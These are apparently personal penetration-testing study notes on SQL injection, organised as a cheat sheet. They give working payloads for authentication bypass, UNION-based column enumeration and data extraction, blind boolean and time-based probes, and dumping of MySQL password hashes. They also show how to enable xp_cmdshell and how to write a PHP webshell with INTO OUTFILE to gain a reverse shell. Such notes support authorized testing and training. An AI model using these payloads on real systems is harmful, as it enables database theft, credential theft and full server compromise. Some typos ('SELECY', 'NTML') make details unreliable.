# SQL Injection

## Cheatsheet

HackTricks: https://book.hacktricks.xyz/pentesting-web/sql-injection
PortSwigger: https://portswigger.net/web-security/sql-injection/cheat-sheet

*Note: in these notes, the injection starts by ending the query string with `'` but it might be a good idea to provide legitimate looking data first in case there are some kind of functionality checks in place?*


## Database Enumeration

First and foremost need to identify database. Follow through with the rest based on idenfitified DB. Use cheatsheets as quick ref for specific DBs.

### Querying Database Information

| Database Type | Query |
| ------------- | ----- |
| Microsoft SQL | `SELECT @@version` |
| MySQL | `SELECT @@version` \|\| `SELECT version()` |
| Oracle | `SELECT * FROM v$version` |
| PostgreSQL | `SELECT version()` |

### Enumeration over Network

The below requires credentialed access:

#### MySQL

We can use `mysql` from Kali to connect to remote MySQL server (3306 is the default MySQL port):
```
mysql -u root -p'root' -h <IP> -P 3306
```
Some useful commands:
- `select version()`
- `select database()`
- `select system_user()` - information about the user of the MYSQL DATABASE (not OS)
- `show databases` - list database
- `SHOW TABLES FROM <database>`
- `SELECT user, authentication_string FROM mysql.user WHERE user = '<username>'` - find usernames and password hashes for a given user of the MySQL Database Service.

#### MSSQL

Commonly found on Windows machines due to native integrations. Uses the Tabular Sata Stream (TDS) network-layer protocol. Can use `impacket-mssqlclient` to connect from Kali or `sqlcmd` to connect from Windows machines. From Kali tho:
```
impacket-mssqlclient <username>:<password>@<IP> -windows-auth
```
- `-windows-auth` option forces NTML authentication
- `SELECT @@version`
- `SELECT name FROM sys.databases` - show databases
- `SELECT * FROM <database>.information_schema.tables` - show DB tables + table schema
- `SELECT * FROM <database>.<schema>.<table>`

### Web Enumeration Flow

Might go something like this:
1. Identify database and version
2. Research known vulnerabilities with database and version
3. Based on database info, extract the database schema
4. Follow through with attacks

## Basic Attacks

- Stuff like `'OR 1=1 -- //` etc.
    - Using the `//` even though there is already a comment starting at `--` is good to avoid whitespace truncation.
- If we have *in-band* error messaging from SQLi, can try something like
    ```
    ' or 1=1 in (SELECT <query>) -- //
    ```
    to embed a whole new query into another. If not we can use `UNION` attacks.


## UNION Attacks

Used to get data from other tables. E.g. `SELECT a, b FROM table1 UNION SELECT c, d FROM table2;`

Requirements:
1. Column count needs to match in each sub-query on either side of `UNION` clause
2. Each column must map to a column in the other query with the same data type. E.g. in above example, if `b` is an integer then `d` must also be an integer

### Requirement 1 - Column Enumeration

Objective: find number of columns in first sub-query to match in second `UNION` sub-query.

Can be achieved via `ORDER BY` clauses:
```
' ORDER BY 1;--
' ORDER BY 2;--
' ORDER BY 3;--
...
```
and examine responses. If this doesn't work, try:
```
' UNION SELECT NULL;--
' UNION SELECT NULL, NULL;--
' UNION SELECT NULL, NULL, NULL;--
...
```
or try HackTricks/PATT/something.

### Requirement 2 - Colum Data Type Enumeration

Example payloads:
```
' UNION SELECT 'a', NULL, NULL;--
' UNION SELECT NULL, 'a', NULL;--
' UNION SELECY NULL, NULL, 'a';--
...
```
and examine responses.

**Note:** When exploiting `UNION` attacks, need to make sure the `UNION`ed column data types match the data type of the column in the corresponding index of the original query! (I.e. if `UNION`ed column index 2 is of type integer, then column index 2 of the original query must also be integer)

### Exploitation

Once vulnerable syntax structure is identified, move onto fun part: use `UNION` to retrieve data from other tables. START WITH DATABASE INFO TO ENUMERATE (e.g. schema, version, DB account user) TABLE NAMES, COLUMNS ETC. - see example payload:

```
===== MySQL =====
' UNION SELECT table_name, column_name, table_schema, NULL FROM information_schema.columns WHERE table_schema=database() -- //
```

To concatenate multiple fields into one (for column matching) use the DB's string concatenation feature (basically group aggregation into string).


## Blind SQL Injection Vulnerabilities

These are when the results of an SQL query is not directly displayed in the application's response content. There are workarounds though.

### Detection Routes

Conditional queries, using `IF`, `SELECT CASE` etc. - First need to identify vulnerability by:
1. Cause an error (which triggers an application-layer error e.g. `500 Internal Server Error` - NOT an error message being returned directly by the SQL service as this would not be blind) e.g. `somedumbdata' AND (SELECT CASE WHEN (conidition) THEN 1/0 ELSE 1 END) = 1` (lookup cheatsheet to refer to error queries) and examine response codes.
2. Examine time delays in responses by using queries that take a while to process - this can be triggered using DB-syntax-specific built-in functions (see cheatsheet)
    ```
    inject' AND IF (<condition>, SLEEP(5), 'false') -- //
    ```

### Exploitation

- Trigger conditional responses e.g. `AND SUBSTRING( (SELECT password FROM users WHERE username = 'admin'), 1, 1) >= 'm'` and repeat using binary search (finally putting that uni work to use) or other search to enumerate data, use output depending on vulnerability to determine results.

Realistically tho, just need to find injection point and then send dat beach straight to sqlmap to do this stuff for us (but it can be noisy af).

### Worst-case Scenario

We pwn the host of the SQL service c:\<

SQL injection *can* in severe cases result in remote code execution or credentials theft (for front-end and back-end accounts); both of which almost certainly results in critical findings.

Methods of gaining RCE depends on the database.
- MSSQL: use `EXECUTE xp_cmdshell '<command>'` to execute commands and get reverse shell
    - Need to enable `xp_cmdshell` first via:
      ```
      ===== MSSQL =====
      EXEC sp_configure 'Show Advanced Options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
      ```
- MySQL: use `INTO OUTFILE` to write a webshell on local disk space of the server. Need to find writeable directory under the web root e.g. `/var/www/html/` and then navigate to this page to execute commands and gain a reverse shell via webshell.
    - If we plug this into a `UNION` attack, it might cause type conflict errors but should still be executed.
    - E.g:
        ```
        ===== MySQL =====
        ' UNION SELECT "<?php system($_GET['cmd']);?>", NULL, NULL, NULL, ... INTO OUTFILE "/path/to/writable/directory/webshell.php" -- //
        ```


## Second-order SQL Injection

First-order SQL injection is what we're used to: payload is taken directly from (usually HTTP) request and incorporated into SQL query. Second-order injection, however, is when the payload is taken directly from HTTP request but then stored in the application via some method (e.g. in database, JSON/XML activity) and then unsafely processed in some later application process.

E.g.
1. Hacker makes account on application. Enters some SQL injection query.
2. Initial checks are performed, injection not executed, but some field containing payload that the attacker entered (if not sanitised) is now stored associated with their profile in the database.
3. If the application loads this data later without sanitisation, payload could be executed. Hacker might update admin credentials or other malicious action.


## Things to keep in mind

1. SQL Injection can appear in many different contexts... Not just, input fields but also request parameters, cookies, XML/JSON requests, anything that involves supplying or asking of data
2. Try to subvert application logic if the query is implemented in a weird way
3. Try to subvert the query logic itself (e.g. remove other requirements in a query via commenting)
4. Try different payload strings, structures, encodings, etc. 
5. Always try to identify DB and version info first
6. Error messages can leak a lot if not appropriately handled
7. Out-of-band testing may be required. This is especially true for asynchronous SQL query actions.